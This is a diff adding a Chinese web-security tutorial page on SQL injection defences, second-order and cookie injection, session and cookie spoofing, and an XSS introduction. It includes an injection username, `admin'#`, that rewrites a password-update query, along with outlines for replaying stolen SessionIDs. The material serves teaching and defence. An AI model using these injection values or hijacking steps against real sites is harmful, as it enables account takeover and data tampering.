+<li>仍然属于 <strong>SQL语句拼接</strong> 的方式，不是最佳实践。</li>
+</ul>
+<h6 id="使用参数化查询（推荐方法）"><a href="#使用参数化查询（推荐方法）" class="headerlink" title="使用参数化查询（推荐方法）"></a><strong>使用参数化查询（推荐方法）</strong></h6><p><strong>参数化查询</strong> 是目前最推荐的防护方式。它通过将用户输入与SQL语句分离，避免用户输入直接影响SQL逻辑。</p>
+<p><strong>为什么参数化查询更安全？</strong></p>
+<ul>
+<li>在参数化查询中，用户输入作为 <strong>参数</strong> 传递，而不是直接拼接到SQL语句中。</li>
+<li>数据库会将参数当作 <strong>普通数据</strong> 处理，而不会解析其中的特殊字符。</li>
+</ul>
+<p><strong>具体实现方式</strong></p>
+<p><strong>MySQLi参数化查询</strong></p>
+<p>使用 MySQLi 的 <code>prepare()</code> 和 <code>bind_param()</code> 方法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>, <span class="hljs-string">&quot;lab&quot;</span>);<br><br><span class="hljs-comment">// 检查连接是否成功</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$conn</span>-&gt;connect_error) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connection failed: &quot;</span> . <span class="hljs-variable">$conn</span>-&gt;connect_error);<br>&#125;<br><br><span class="hljs-comment">// 准备SQL语句</span><br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT * FROM books WHERE id = ?&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);  <span class="hljs-comment">// &quot;i&quot; 表示参数是整数类型</span><br><br><span class="hljs-comment">// 执行SQL查询</span><br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">get_result</span>();<br><br><span class="hljs-comment">// 输出结果</span><br><span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>()) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Name: &quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;name&quot;</span>] . <span class="hljs-string">&quot; - Description: &quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;description&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p><strong>代码解析</strong>：</p>
+<ul>
+<li><strong><code>prepare()</code></strong>：预编译SQL语句，将用户输入作为参数。</li>
+<li><strong><code>bind_param()</code></strong>：绑定参数到SQL语句中。</li>
+<li><strong><code>execute()</code></strong>：执行SQL语句时，数据库将用户输入当作普通数据，不会解析为SQL逻辑。</li>
+</ul>
+<p><strong>优点</strong>：</p>
+<ul>
+<li>防护效果好，从根本上解决了SQL注入问题。</li>
+<li>安全性高，不需要额外处理转义或编码问题。</li>
+</ul>
+<p><strong>缺点</strong>：</p>
+<ul>
+<li>需要学习和理解新语法。</li>
+</ul>
+<p><strong>PDO参数化查询</strong></p>
+<p><strong>PDO</strong> 是PHP另一种操作数据库的方式，支持参数化查询。</p>
+<p><strong>代码实现</strong>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dsn</span> = <span class="hljs-string">&quot;mysql:host=localhost;dbname=lab&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-variable">$dsn</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br><br>    <span class="hljs-comment">// 设置PDO错误模式为异常</span><br>    <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>, PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>);<br><br>    <span class="hljs-comment">// 准备参数化SQL语句</span><br>    <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT * FROM books WHERE id = :id&quot;</span>);<br>    <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>(<span class="hljs-string">&#x27;:id&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>], PDO::<span class="hljs-variable constant_">PARAM_INT</span>);<br><br>    <span class="hljs-comment">// 执行SQL语句</span><br>    <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br><br>    <span class="hljs-comment">// 获取查询结果</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>(PDO::<span class="hljs-variable constant_">FETCH_ASSOC</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Name: &quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;name&quot;</span>] . <span class="hljs-string">&quot; - Description: &quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;description&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p><strong>代码解析</strong>：</p>
+<ul>
+<li><strong><code>:id</code></strong> 是占位符，用户输入通过 <code>bindParam()</code> 绑定到占位符上。</li>
+<li><strong><code>PDO::PARAM_INT</code></strong> 指定参数的类型为整数，进一步增强安全性。</li>
+</ul>
+<p><strong>优点</strong>：</p>
+<ul>
+<li>同样能从根本上防护SQL注入攻击。</li>
+<li>支持多种数据库（如MySQL、PostgreSQL、SQLite）。</li>
+</ul>
+<p><strong>缺点</strong>：</p>
+<ul>
+<li>学习成本稍高。</li>
+</ul>
+<h6 id="其他防护措施"><a href="#其他防护措施" class="headerlink" title="其他防护措施"></a><strong>其他防护措施</strong></h6><p>除了代码防护，还可以通过其他手段增强安全性：</p>
+<ol>
+<li><p><strong>限制用户输入</strong></p>
+<p>对用户输入的数据进行严格的格式验证，例如只允许数字或字母。</p>
+<p>示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Invalid input&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><strong>优点</strong>：能阻止部分注入攻击。</p>
+<p><strong>缺点</strong>：对复杂数据的防护有限。</p>
+</li>
+<li><p><strong>限制数据库权限</strong></p>
+<p>最小权限原则：</p>
+<ul>
+<li>应用程序使用的数据库账户只授予必要的权限（如查询和插入）。</li>
+<li>禁止高权限操作（如删除或修改数据库结构）。</li>
+</ul>
+<p><strong>优点</strong>：即使注入攻击成功，损失也会减少。</p>
+<p><strong>缺点</strong>：无法完全杜绝攻击。</p>
+</li>
+<li><p><strong>使用Web应用防火墙（WAF）</strong></p>
+<ul>
+<li>部署WAF可以检测和拦截常见的SQL注入攻击请求。</li>
+<li><strong>优点</strong>：无需修改代码即可提供额外防护。</li>
+<li><strong>缺点</strong>：需要额外的资源和配置。</li>
+</ul>
+</li>
+</ol>
+<h6 id="防护对比总结"><a href="#防护对比总结" class="headerlink" title="防护对比总结"></a><strong>防护对比总结</strong></h6><div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:center"><strong>防护方式</strong></th>
+<th style="text-align:center"><strong>优点</strong></th>
+<th style="text-align:center"><strong>缺点</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><strong>转义函数</strong></td>
+<td style="text-align:center">简单易用，能防护基本攻击</td>
+<td style="text-align:center">有宽字符绕过风险，不彻底</td>
+</tr>
+<tr>
+<td style="text-align:center"><strong>参数化查询</strong></td>
+<td style="text-align:center">根本性解决注入问题，安全性高</td>
+<td style="text-align:center">需要学习新的语法，稍复杂</td>
+</tr>
+<tr>
+<td style="text-align:center"><strong>限制用户输入</strong></td>
+<td style="text-align:center">简单直接，适用于简单场景</td>
+<td style="text-align:center">不适用于复杂的数据输入</td>
+</tr>
+<tr>
+<td style="text-align:center"><strong>限制数据库权限</strong></td>
+<td style="text-align:center">减少攻击损失，增强数据库安全</td>
+<td style="text-align:center">不能防止注入攻击发生</td>
+</tr>
+<tr>
+<td style="text-align:center"><strong>Web应用防火墙</strong></td>
+<td style="text-align:center">提供额外的安全层，拦截多种攻击</td>
+<td style="text-align:center">需要额外配置，可能影响性能</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h4 id="项目5-更新密码二阶注入攻击"><a href="#项目5-更新密码二阶注入攻击" class="headerlink" title="项目5 更新密码二阶注入攻击"></a>项目5 更新密码二阶注入攻击</h4><ul>
+<li><p>原理：利用 SQL 注入攻击，通过注册一个特殊的账号，并使用修改密码功能，绕过权限检查，修改其他账号的密码。</p>
+</li>
+<li><p>概念：SQL 注入攻击、二阶注入攻击、Session 验证、SQL 语句拼接、信息泄露。</p>
+</li>
+</ul>
+<h5 id="二阶SQL注入"><a href="#二阶SQL注入" class="headerlink" title="二阶SQL注入"></a><strong>二阶SQL注入</strong></h5><p><strong>定义</strong>：</p>
+<ul>
+<li>一阶注入：攻击字符串直接通过HTTP请求注入数据库，立即执行（如万能密码）。</li>
+<li>二阶注入：攻击字符串先存储在数据库中，再通过后续查询或更新操作引发攻击。</li>
+</ul>
+<p><strong>特点</strong>：</p>
+<ul>
+<li>隐蔽性强，绕过一次性防护措施（如转义）。</li>
+<li>攻击在二次数据库交互时发生。</li>
+</ul>
+<p><strong>危害</strong>：</p>
+<ul>
+<li>修改或删除数据库内容。</li>
+<li>篡改敏感数据（如用户密码）。</li>
+</ul>
+<h5 id="更新密码与二阶注入攻击"><a href="#更新密码与二阶注入攻击" class="headerlink" title="更新密码与二阶注入攻击"></a><strong>更新密码与二阶注入攻击</strong></h5><p>在密码更新过程中，若SQL语句未对输入数据进行防护，可能引发二阶注入。</p>
+<p>示例：更新密码时，使用未处理的用户数据构造SQL语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">UPDATE</span> users <span class="hljs-keyword">SET</span> passcode <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;$pass&#x27;</span> <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;$username&#x27;</span>;<br></code></pre></td></tr></table></figure>
+<p>如果<code>$username</code>中包含恶意SQL代码（如<code>admin&#39;#</code>），可能导致更新逻辑被破坏。</p>
+<p><strong>分析</strong>：</p>
+<p><strong>注册功能</strong>：</p>
+<p>使用转义函数处理输入，将单引号和井号转义后存储，未破坏SQL语句逻辑。</p>
+<p>示例SQL语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users (username, passcode) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;admin\&#x27;</span>#<span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">123456</span><span class="hljs-string">&#x27;);</span><br></code></pre></td></tr></table></figure>
+<p><strong>更新密码功能</strong>：</p>
+<p>更新密码时未对输入参数进行完整防护。</p>
+<p>构造的SQL语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">UPDATE</span> users <span class="hljs-keyword">SET</span> passcode <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span># <span class="hljs-keyword">AND</span> passcode <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;123456&#x27;</span>;<br></code></pre></td></tr></table></figure>
+<p><code>#</code>注释掉后续条件，使得查询条件变为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">UPDATE</span> users <span class="hljs-keyword">SET</span> passcode <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span>;<br></code></pre></td></tr></table></figure>
+<p>结果：仅用户<code>admin</code>的密码被修改。</p>
+<h5 id="二阶注入攻击防护"><a href="#二阶注入攻击防护" class="headerlink" title="二阶注入攻击防护"></a>二阶注入攻击防护</h5><ol>
+<li><p><strong>PHP转义函数</strong>：</p>
+<p>使用 <code>mysqli_real_escape_string()</code> 转义特殊字符。</p>
+<p>修改代码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">$username <span class="hljs-operator">=</span> mysqli_real_escape_string($conn, $_SESSION[<span class="hljs-string">&#x27;username&#x27;</span>]);<br></code></pre></td></tr></table></figure>
+<p>测试结果：</p>
+<p>重新登录并修改密码，数据库中<code>admin&#39;#</code>的密码被更新，而<code>admin</code>的密码保持不变。</p>
+</li>
+<li><p><strong>MySQLi参数化更新</strong>：</p>
+<p>使用参数化查询防护注入攻击。</p>
+<p>示例代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;UPDATE users SET passcode = ? WHERE username = ? AND passcode = ?&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&quot;sss&quot;</span>, <span class="hljs-variable">$new_pass</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$current_pass</span>);<br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br></code></pre></td></tr></table></figure>
+<p>测试结果：</p>
+<p>更新密码功能正常，防护二阶注入攻击。</p>
+</li>
+<li><p><strong>正则表达式过滤</strong>：</p>
+<p>对用户名和密码设置规范：</p>
+<p>只能使用小写字母、数字和下划线，长度限制32字符。</p>
+<p>示例代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9_]&#123;1,32&#125;$/&#x27;</span>, <span class="hljs-variable">$username</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;用户名格式不合法&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="项目6-Cookie-注入攻击"><a href="#项目6-Cookie-注入攻击" class="headerlink" title="项目6 Cookie 注入攻击"></a>项目6 Cookie 注入攻击</h4><ul>
+<li><p>原理：利用 SQL 注入攻击，通过修改浏览器的 Cookie 信息，绕过登录验证，获取用户权限。</p>
+</li>
+<li><p>概念：SQL 注入攻击、Cookie、SessionID、信息泄露、Cookie 编辑插件。</p>
+</li>
+</ul>
+<h5 id="Cookie的概念"><a href="#Cookie的概念" class="headerlink" title="Cookie的概念"></a><strong>Cookie的概念</strong></h5><ul>
+<li><strong>定义</strong>：<ul>
+<li>Cookie是Web服务器存储在客户端的一小段数据，用于保存用户状态。</li>
+<li>应用场景：免登录功能、保存用户偏好、统计访问数据等。</li>
+</ul>
+</li>
+<li><strong>格式</strong>：<ul>
+<li>键值对：<code>key=value</code>。</li>
+<li>URL编码：键和值必须进行URL编码。</li>
+<li>多对Cookie之间用分号和空格分隔。</li>
+</ul>
+</li>
+<li><strong>生命周期</strong>：<ul>
+<li>设置<code>Expires</code>属性决定Cookie的有效期。</li>
+<li>不设置<code>Expires</code>：浏览器关闭后Cookie失效。</li>
+</ul>
+</li>
+</ul>
+<h5 id="Cookie与Session的区别"><a href="#Cookie与Session的区别" class="headerlink" title="Cookie与Session的区别"></a><strong>Cookie与Session的区别</strong></h5><div class="table-container">
+<table>
+<thead>
+<tr>
+<th><strong>特性</strong></th>
+<th><strong>Cookie</strong></th>
+<th><strong>Session</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>存储位置</strong></td>
+<td>客户端</td>
+<td>服务器</td>
+</tr>
+<tr>
+<td><strong>信息安全性</strong></td>
+<td>较低，用户可查看和修改</td>
+<td>较高，用户无法直接访问</td>
+</tr>
+<tr>
+<td><strong>适用场景</strong></td>
+<td>保存用户偏好、免登录等</td>
+<td>保存用户状态（如登录状态）</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h5 id="Cookie注入攻击"><a href="#Cookie注入攻击" class="headerlink" title="Cookie注入攻击"></a><strong>Cookie注入攻击</strong></h5><ul>
+<li><strong>原理</strong>：<ul>
+<li>攻击者通过修改Cookie的内容，将恶意SQL语句嵌入其中，提交给服务器。</li>
+<li>攻击过程类似于Post型或Get型SQL注入，但更隐蔽。</li>
+</ul>
+</li>
+<li><strong>危害</strong>：<ul>
+<li>数据库暴露：泄露敏感数据。</li>
+<li>系统篡改：修改或破坏数据库内容。</li>
+<li>Cookie SQL 注入攻击与常见的 GET/POST SQL 注入方式类似，其区别仅在于数据提交方式的不同，但危害一致。通过不当的查询操作，攻击者可访问甚至更改数据库中的敏感信息。</li>
+</ul>
+</li>
+</ul>
+<h5 id="Cookie注入攻击防护"><a href="#Cookie注入攻击防护" class="headerlink" title="Cookie注入攻击防护"></a>Cookie注入攻击防护</h5><ol>
+<li><p><strong>转义函数</strong>：</p>
+<ul>
+<li><p>使用<code>mysqli_real_escape_string()</code>对Cookie值进行转义。</p>
+</li>
+<li><p>修改代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cookee</span> = <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;account&#x27;</span>]);<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>测试结果：</p>
+<ul>
+<li>修改Cookie内容后，SQL注入攻击失效。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>参数化查询</strong>：</p>
+<ul>
+<li><p>使用MySQLi或PDO实现参数化查询。</p>
+</li>
+<li><p>示例代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$con</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;account&#x27;</span>]);<br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br></code></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<h4 id="项目7-HTTP-头部注入攻击"><a href="#项目7-HTTP-头部注入攻击" class="headerlink" title="项目7 HTTP 头部注入攻击"></a>项目7 HTTP 头部注入攻击</h4><ul>
+<li><p>原理：利用 SQL 注入攻击，通过修改浏览器的 HTTP 头部信息，绕过登录验证，获取用户权限。</p>
+</li>
+<li><p>概念：SQL 注入攻击、HTTP 头部、User-Agent、信息泄露、Live HTTP Headers 插件。</p>
+</li>
+</ul>
+<h3 id="第三篇-前端攻击及防护"><a href="#第三篇-前端攻击及防护" class="headerlink" title="第三篇 前端攻击及防护"></a>第三篇 前端攻击及防护</h3><h4 id="项目8-Session-欺骗攻击"><a href="#项目8-Session-欺骗攻击" class="headerlink" title="项目8 Session 欺骗攻击"></a>项目8 Session 欺骗攻击</h4><ul>
+<li><p>原理：利用 Session 欺骗攻击，通过复制登录用户的 SessionID，绕过登录验证，获取用户权限。</p>
+</li>
+<li><p>概念：Session 欺骗、SessionID、信息泄露、User-Agent 验证、退出登录。</p>
+</li>
+</ul>
+<h5 id="Session欺骗攻击基础"><a href="#Session欺骗攻击基础" class="headerlink" title="Session欺骗攻击基础"></a><strong>Session欺骗攻击基础</strong></h5><ol>
+<li><strong>Session的工作原理</strong>：<ul>
+<li>用户登录后，服务器端生成Session用于保存用户状态，并创建一个SessionID作为用户身份标识。</li>
+<li>浏览器通过Cookie存储SessionID，并在后续访问中将SessionID发送至服务器进行身份验证。</li>
+</ul>
+</li>
+<li><strong>Session欺骗攻击原理</strong>：<ul>
+<li>攻击者通过复制合法用户的SessionID，使未授权的用户伪装成已登录用户，从而获得相应的访问权限。</li>
+<li>攻击者通常无法完成需要密码确认的操作（如修改密码）。</li>
+</ul>
+</li>
+<li><strong>Session欺骗的危害</strong>：<ul>
+<li>身份被冒用可能导致权限控制失效。</li>
+<li>未经授权的用户可能访问敏感资源。</li>
+</ul>
+</li>
+</ol>
+<h5 id="Session欺骗攻击测试"><a href="#Session欺骗攻击测试" class="headerlink" title="Session欺骗攻击测试"></a><strong>Session欺骗攻击测试</strong></h5><ol>
+<li><strong>攻击步骤</strong>：<ul>
+<li><strong>环境准备</strong>：利用已有登录功能的网站（如项目3），在不同浏览器上实施攻击。</li>
+<li>获取SessionID：<ul>
+<li>在浏览器中登录后，通过开发者工具或插件（如Live HTTP Headers）获取SessionID。</li>
+</ul>
+</li>
+<li>实施攻击：<ul>
+<li>在另一浏览器中通过修改请求头中的SessionID，伪装为已登录用户。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>测试现象</strong>：<ul>
+<li>未登录的情况下，通过伪造SessionID可以直接获得与登录用户相同的权限。</li>
+</ul>
+</li>
+</ol>
+<h5 id="Session欺骗防护措施"><a href="#Session欺骗防护措施" class="headerlink" title="Session欺骗防护措施"></a><strong>Session欺骗防护措施</strong></h5><h6 id="1-使用注销机制"><a href="#1-使用注销机制" class="headerlink" title="1. 使用注销机制"></a><strong>1. 使用注销机制</strong></h6><ul>
+<li>用户退出登录时调用服务器端的注销函数（如logout.php），销毁Session。</li>
+<li>避免仅关闭浏览器，而未主动注销登录造成Session仍有效。</li>
+</ul>
+<h6 id="2-设置Session的生存时间"><a href="#2-设置Session的生存时间" class="headerlink" title="2. 设置Session的生存时间"></a><strong>2. 设置Session的生存时间</strong></h6><ul>
+<li>PHP默认Session有效期为1440秒（24分钟）。</li>
+<li>在程序中严格控制Session生存时间，避免长期暴露的SessionID被盗用。</li>
+</ul>
+<h6 id="3-检测User-Agent的一致性"><a href="#3-检测User-Agent的一致性" class="headerlink" title="3. 检测User-Agent的一致性"></a><strong>3. 检测User-Agent的一致性</strong></h6><ul>
+<li>登录后将浏览器的User-Agent信息存储在Session中。</li>
+<li>每次请求时比对User-Agent是否一致，不一致则判定为异常访问。</li>
+</ul>
+<h6 id="4-重置SessionID"><a href="#4-重置SessionID" class="headerlink" title="4. 重置SessionID"></a><strong>4. 重置SessionID</strong></h6><ul>
+<li>在Session会话启动或刷新时调用<code>session_regenerate_id(true)</code>重置SessionID，使旧的SessionID失效。</li>
+<li>此方法虽不能完全防护，但可增加攻击难度。</li>
+</ul>
+<h4 id="项目9-Cookie-欺骗攻击"><a href="#项目9-Cookie-欺骗攻击" class="headerlink" title="项目9 Cookie 欺骗攻击"></a>项目9 Cookie 欺骗攻击</h4><ul>
+<li><p>原理：利用 Cookie 欺骗攻击，通过复制登录用户的 Cookie 信息，绕过登录验证，获取用户权限。</p>
+</li>
+<li><p>概念：Cookie 欺骗、信息泄露、特殊键值对、User-Agent 验证、退出登录。</p>
+</li>
+</ul>
+<h5 id="Cookie工作原理"><a href="#Cookie工作原理" class="headerlink" title="Cookie工作原理"></a><strong>Cookie工作原理</strong></h5><ul>
+<li><strong>Cookie定义</strong>：存储于客户端，用于保存用户信息的小型文本数据。</li>
+<li><strong>用途</strong>：会话保持、免登录认证等。</li>
+<li><strong>有效期</strong>：可以设置生命周期，短期存储会话信息或长期存储用户信息。</li>
+</ul>
+<h5 id="Cookie欺骗攻击"><a href="#Cookie欺骗攻击" class="headerlink" title="Cookie欺骗攻击"></a><strong>Cookie欺骗攻击</strong></h5><ul>
+<li><strong>原理</strong>：攻击者获取或猜测合法用户的Cookie，将其伪装注入其他浏览器，绕过身份验证。</li>
+<li>危害：<ul>
+<li>攻击者获得合法用户权限。</li>
+<li>Cookie长期有效，比Session更易被攻击。</li>
+</ul>
+</li>
+</ul>
+<h5 id="Cookie欺骗测试"><a href="#Cookie欺骗测试" class="headerlink" title="Cookie欺骗测试"></a>Cookie欺骗测试</h5><ol>
+<li>准备工作：<ul>
+<li>修改数据库（添加记录客户端信息的字段）。</li>
+<li>在现有网站中启用Cookie认证。</li>
+</ul>
+</li>
+<li>测试过程：<ul>
+<li><strong>方式一</strong>：直接猜测Cookie键值对。</li>
+<li><strong>方式二</strong>：在一个浏览器中登录获取Cookie信息，复制到另一浏览器实现欺骗。</li>
+</ul>
+</li>
+</ol>
+<h5 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h5><ol>
+<li>设置特殊键值对：<ul>
+<li>使用MD5散列登录密码生成不易猜测的键值对。</li>
+</ul>
+</li>
+<li>检测User-Agent一致性：<ul>
+<li>登录时将User-Agent信息保存为散列值，后续请求中比对一致性。</li>
+</ul>
+</li>
+</ol>
+<h4 id="项目10-XSS-跨站攻击"><a href="#项目10-XSS-跨站攻击" class="headerlink" title="项目10 XSS 跨站攻击"></a>项目10 XSS 跨站攻击</h4><ul>
+<li><p>原理：利用 XSS 跨站攻击，通过在用户输入的内容中嵌入恶意脚本，绕过浏览器安全机制，执行攻击者控制的代码。</p>
+</li>
+<li><p>概念：XSS 跨站攻击、持久型 XSS、非持久型 XSS、HTML 转义、JavaScript 转义、Cookie 的 HttpOnly 属性。</p>
+</li>
+</ul>
+<h5 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h5><ol>
+<li><strong>XSS跨站攻击原理</strong>：<ul>
+<li>XSS表示Cross Site Scripting，用于区别于CSS（层叠样式表）。</li>
+<li>本质：通过提交恶意HTML或JavaScript代码，当被嵌入网页后，代码会被执行，导致网页运行非设计功能的脚本。</li>
